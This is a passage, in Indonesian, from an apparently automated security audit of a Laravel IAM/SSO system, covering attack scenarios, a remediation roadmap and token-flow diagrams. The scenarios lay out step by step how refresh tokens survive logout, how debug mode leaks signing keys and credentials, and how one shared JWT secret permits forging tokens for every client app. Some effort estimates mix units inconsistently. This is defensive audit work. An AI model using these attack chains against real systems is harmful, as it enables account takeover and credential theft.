**Kerentanan terkait:** F-002 (endpoint tanpa autentikasi)

### Skenario C: Persistensi Akses Pasca-Logout

```
1. Pengguna melakukan autentikasi pada t=0 → mendapatkan refresh token
2. Pengguna logout pada t=600 → user_logout_at = 600
3. Penyerang mendapatkan refresh token (dari log, malware, dll.)
4. Penyerang memanggil POST /oauth/token dengan grant_type=refresh_token
5. JWTTokenService::verifyToken() — TANPA pengecekan logout → LULUS
6. Penyerang mendapatkan access token baru
7. Penyerang mengakses aplikasi klien sebagai pengguna terautentikasi

Bahkan jika jalur Sistem #1 gagal (karena TokenBuilder::refresh() memanggil verify()):
8. Penyerang memanggil POST /api/sso/token (jalur OAuth2)
9. SsoFlowService menggunakan JWTTokenService — TANPA pengecekan logout → LULUS
10. Token diterbitkan dengan sukses
```

**Kerentanan terkait:** F-003 (refresh melewati pencabutan), F-008 (implementasi tidak konsisten)

### Skenario D: Kompromi Kunci via Mode Debug

```
1. Penyerang mengirimkan permintaan yang sengaja dibuat bermasalah ke IAM
   (mis. format JWT tidak valid, base64 tidak valid)
2. APP_DEBUG=true merender halaman debug Laravel
3. Halaman menampilkan semua variabel environment:
   APP_KEY, IAM_JWT_SECRET, DB_PASSWORD, AWS_SECRET_ACCESS_KEY
4. Penyerang sekarang memiliki:
   a) Kunci penandatanganan JWT → memalsukan token sebagai pengguna apa pun
   b) Laravel APP_KEY → mendekripsi sesi, memalsukan cookie
   c) Kredensial Database → akses database langsung
   d) Kredensial AWS → akses ke S3/MinIO
5. Seluruh sistem berhasil diambil alih
```

**Kerentanan terkait:** F-009 (APP_DEBUG=true), F-004 (APP_KEY bersama)

### Skenario E: Kompromi Aplikasi Klien → Pengambilalihan Federasi Global

```
1. Lingkungan: IAM mengelola 10 aplikasi klien (siimut, incident, admin-panel, dll.)
2. SEMUA token untuk SEMUA aplikasi ditandatangani dengan IAM_JWT_SECRET tunggal
3. Penyerang meretas aplikasi "siimut" (SQLi, RCE, dependensi terkompromi)
4. Penyerang membaca file .env dari siimut → mendapatkan IAM_JWT_SECRET
5. Dengan kunci global, penyerang memalsukan token untuk aplikasi manapun:
   a) Palsukan token untuk "incident" sebagai admin → akses data incident
   b) Palsukan token untuk "admin-panel" sebagai super-admin → akses admin panel IAM
   c) Palsukan token untuk aplikasi klien apa pun di masa mendatang
6. Pembobolan pada SATU aplikasi berkeamanan rendah menjadi pembobolan untuk SEMUA aplikasi

Pertahanan berlapis (Defense-in-depth) yang TIDAK membantu:
  ❌ Segmentasi jaringan (token ditandatangani, bukan diproksi)
  ❌ Web Application Firewall (token yang dipalsukan memiliki tanda tangan valid)
  ❌ Audit logging (token palsu terlihat identik dengan token asli)

Apa yang BISA membantu (dan tidak ada di sini):
  ✅ Kunci penandatanganan per-aplikasi — F-018
  ✅ Penegakan klaim aud — F-007
  ✅ Payload token minimal (tanpa roles_by_app) — F-018
```

**Kerentanan terkait:** F-018 (kunci global tunggal), F-007 (hilangnya klaim aud)

---

## 5. Peta Jalan Perbaikan

### Fase 1: Segera (1-2 Hari) — Hentikan Pendarahan

| Prioritas | Temuan | Upaya | Kompleksitas |
|:--------:|---------|:------:|:----------:|
| P0 | **F-001:** Berhenti mengirim token dalam URL query string | 2j | Rendah |
| P0 | **F-002:** Tambahkan autentikasi ke TokenExpiredNotification | 1j | Rendah |
| P0 | **F-009:** Setel `APP_DEBUG=false` di produksi | 5m | Rendah |
| P0 | **F-003:** Gunakan `verify()` alih-alih `decode()` pada alur refresh | 2j | Rendah |
| P1 | **F-005:** Tambahkan middleware `auth` ke rantai logout | 15m | Rendah |

### Fase 2: Jangka Pendek (1 Minggu) — Perkuat Inti

| Prioritas | Temuan | Upaya | Kompleksitas |
|:--------:|---------|:------:|:----------:|
| P1 | **F-004:** Tetapkan kunci unik, hapus kaskade APP_KEY | 4j | Sedang |
| P1 | **F-006:** Implementasikan klaim `jti` + blacklist | 6j | Sedang |
| P1 | **F-007:** Tambahkan klaim `aud` + validasi audiens | 4j | Rendah |
| P1 | **F-018:** Hapus `roles_by_app` dari payload token | 2j | Rendah |
| P2 | **F-010:** Aktifkan enkripsi sesi dan cookie yang aman | 1j | Rendah |
| P2 | **F-011:** Perketat pola origin CORS | 30m | Rendah |
| P2 | **F-015:** Hapus pesan error dari introspeksi | 1j | Rendah |

### Fase 3: Jangka Menengah (2-4 Minggu) — Peningkatan Arsitektur

| Prioritas | Temuan | Upaya | Kompleksitas |
|:--------:|---------|:------:|:----------:|
| P0 | **F-018:** Buat `IAM_JWT_SECRET` produksi yang unik (bukan dari .env.example!) | 30m | Rendah |
| P1 | **F-008:** Konsolidasikan menjadi implementasi JWT tunggal | 3h | Tinggi |
| P1 | **F-018:** Implementasi kunci penandatanganan per-aplikasi (kid + registri kunci per-aplikasi) | 3h | Tinggi |
| P2 | **F-012:** Tambahkan klaim `nbf` dengan penanganan clock skew | 2j | Rendah |
| P3 | **F-013:** Implementasikan mekanisme rotasi kunci | 2h | Tinggi |
| P3 | **F-014:** Sederhanakan konfigurasi secret | 1j | Rendah |
| P3 | Rotasi refresh token pada setiap penggunaan | 1h | Sedang |

### Ringkasan Upaya

| Fase | Perkiraan Jam | Pengurangan Risiko |
|:-----:|:---------------:|:--------------:|
| Fase 1 | ~5j | **85%** |
| Fase 2 | ~17j | **93%** |
| Fase 3 | ~9h | **99.5%** |

---

## 6. Diagram Arsitektur

### Alur Penerbitan & Verifikasi Token

```
┌───────────────────────────────────────────────────────────────────────────────────┐
│                           ALUR PENERBITAN TOKEN                                    │
├───────────────────────────────────────────────────────────────────────────────────┤
│                                                                                   │
│  Browser Pengguna           Server IAM                    Aplikasi Klien          │
│     │                          │                              │                   │
│     │  1. Login                │                              │                   │
│     │─────────────────────────►│                              │                   │
│     │                          │                              │                   │
│     │  2. GET /sso/redirect    │                              │                   │
│     │   ?app=client-a          │                              │                   │
│     │─────────────────────────►│                              │                   │
│     │                          │  TokenBuilder:               │                   │
│     │                          │  • buildClaimsForUser()      │                   │
│     │                          │  • encode()                  │                   │
│     │                          │                              │                   │
│     │  3. 302 → client-a.com   │                              │                   │
│     │      /callback?token=JWT │  🔴 F-001: Token dalam URL!  │                   │
│     │◄─────────────────────────│──────────────────────────────│                   │
│     │                          │                              │                   │
│     │  4. Browser mengikuti    │                              │                   │
│     │     redirect             │                              │                   │
│     │─────────────────────────────────────────────────────────►                   │
│     │                          │                              │                   │
│     │                          │  5. POST /api/sso/verify     │                   │
│     │                          │     { token: JWT }           │                   │
│     │                          │◄─────────────────────────────│                   │
│     │                          │                              │                   │
│     │                          │  TokenBuilder::verify()      │                   │
│     │                          │  • decode()                  │                   │
│     │                          │  • isExpired()               │                   │
│     │                          │  • cek user_logout_at        │                   │
│     │                          │  • cek sesi aktif            │                   │
│     │                          │                              │                   │
│     │                          │  6. { data pengguna }        │                   │
│     │                          │─────────────────────────────►│                   │
│     │                          │                              │                   │
│     │  7. Pertukaran Token OAuth2 (Server-to-Server)          │                   │
│     │                          │  POST /oauth/token           │                   │
│     │                          │◄─────────────────────────────│                   │
│     │                          │                              │                   │
│     │                          │  SsoFlowService::token()     │                   │
│     │                          │  • JWTTokenService::         │                   │
│     │                          │    generateAccessToken()     │                   │
│     │                          │    generateRefreshToken()    │                   │
│     │                          │                              │                   │
│     │                          │  8. { access_token,          │                   │
│     │                          │       refresh_token }        │                   │
│     │                          │─────────────────────────────►│                   │
│                                                                                   │
└───────────────────────────────────────────────────────────────────────────────────┘

┌───────────────────────────────────────────────────────────────────────────────────┐
│                           PENGECEKAN PENCABUTAN TOKEN                              │
├───────────────────────────────────────────────────────────────────────────────────┤
│                                                                                   │
│  Pengecekan yg dilakukan   TokenBuilder  JWTTokenService    TokenService           │
│                            ::verify()    ::verifyToken()    ::verify()             │
│  ────────────────────────  ───────────  ─────────────────   ────────────          │
│  Verifikasi tanda tangan      ✅            ✅                 ✅                 │
│  Cek kedaluwarsa              ✅            ✅                 ✅                 │
│  Cek user_logout_at           ✅            ❌ F-003          ❌ F-003            │
│  Cek sesi aktif               ✅            ✅                 ❌                 │
│  Cek blacklist jti            ❌ F-006      ❌ F-006          ❌ F-006            │
│  Validasi aud                 ❌ F-007      ❌ F-007          ❌ F-007            │
│  Jeda pergeseran waktu        ✅ (60s)      ❌                ❌                  │
│  Cek nbf                      ❌ F-012      ❌ F-012          ❌ F-012            │
│                                                                                   │
└───────────────────────────────────────────────────────────────────────────────────┘
```

---

## Lampiran

### A. File yang Diaudit

| File | Ukuran | Peran |
|------|:----:|------|
| `app/Services/JWTTokenService.php` | 243 baris | Penerbitan & verifikasi token OAuth2 |
| `app/Domain/Iam/Services/TokenBuilder.php` | 284 baris | Penerbitan, verifikasi, refresh token SSO |
| `app/Services/Sso/TokenService.php` | 408 baris | Terbitkan & verifikasi token HMAC kustom |
| `app/Domain/Iam/DataTransferObjects/TokenClaims.php` | 157 baris | DTO Klaim token |
| `app/Http/Controllers/SSOController.php` | 72 baris | Controller SSO mirip OAuth2 |
| `app/Http/Controllers/Sso/SsoRedirectController.php` | 163 baris | Redirect token SSO |
| `app/Http/Controllers/Sso/SsoVerifyController.php` | 130 baris | Verifikasi token SSO |
| `app/Http/Controllers/Sso/SsoLogoutChainController.php` | 57 baris | Logout front-channel |
| `app/Http/Controllers/Api/SSOController.php` | 99 baris | Jembatan kode auth admin panel |
| `app/Http/Controllers/Api/TokenExpiredNotificationController.php` | 88 baris | Notifikasi token kedaluwarsa |
| `app/Http/Middleware/VerifySsoJwtApi.php` | 57 baris | Middleware verifikasi SSO JWT |
| `app/Http/Middleware/VerifyIAMAccessToken.php` | 78 baris | Middleware access token IAM |
| `app/Http/Middleware/ValidateApiKey.php` | 63 baris | Validasi API key |
| `app/Domain/Iam/Http/Controllers/SsoTokenController.php` | 328 baris | Operasi token SSO yang diperluas |
| `app/Domain/Iam/Models/Application.php` | 188 baris | Model Application dengan verifikasi rahasia |
| `app/Services/Sso/SsoFlowService.php` | 360 baris | Alur kode otorisasi OAuth2 |
| `app/Services/Auth/SessionService.php` | 205 baris | Manajemen sesi Login/logout |
| `config/iam.php` | 417 baris | Konfigurasi IAM |
| `config/sso.php` | 51 baris | Konfigurasi SSO |
| `routes/sso.php` | 98 baris | Definisi rute SSO |
| `.env` | 128 baris | Konfigurasi environment |

---

### B. Alat & Referensi

- **Top 25 CWE:** https://cwe.mitre.org/top25/
- **Praktik Terbaik Keamanan OAuth 2.0 (RFC 9700):** https://www.rfc-editor.org/rfc/rfc9700
- **Praktik Terbaik JWT (RFC 8725):** https://www.rfc-editor.org/rfc/rfc8725
- **JSON Web Token (RFC 7519):** https://www.rfc-editor.org/rfc/rfc7519
- **Penggunaan Token Bearer (RFC 6750):** https://www.rfc-editor.org/rfc/rfc6750

---

*Laporan disiapkan oleh audit keamanan otomatis. Temuan harus diverifikasi secara independen sebelum perbaikan dilakukan.*
